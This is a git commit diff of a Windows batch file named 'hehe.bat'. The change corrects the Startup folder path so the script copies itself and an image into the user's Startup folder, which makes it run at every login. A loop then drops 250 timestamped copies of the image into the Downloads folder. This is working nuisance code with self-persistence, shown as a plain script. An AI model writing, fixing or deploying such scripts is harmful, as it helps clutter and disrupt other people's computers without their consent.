79c074cd090d7459bb0a0adaa306133d056451fd
terrortoon <81480921+terrortoon@users.noreply.github.com>
2024-02-18 19:49:03 +0100

    Update hehe.bat

--- hehe.bat
+++ hehe.bat
@@ -1,6 +1,6 @@
 @echo off
-Xcopy /I /Y .\hehe.bat %AppData%\Microsoft\Windows\StartMenu\Programs\Startup\
-Xcopy /I /Y .\hehe.jpg %AppData%\Microsoft\Windows\StartMenu\Programs\Startup\
+Xcopy /I /Y .\hehe.bat %AppData%\Microsoft\Windows\Start Menu\Programs\Startup\
+Xcopy /I /Y .\hehe.jpg %AppData%\Microsoft\Windows\Start Menu\Programs\Startup\
 
 FOR /L %%A IN (1,1,250) DO (
 	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Downloads\hehe"%%A""%time%".jpg*
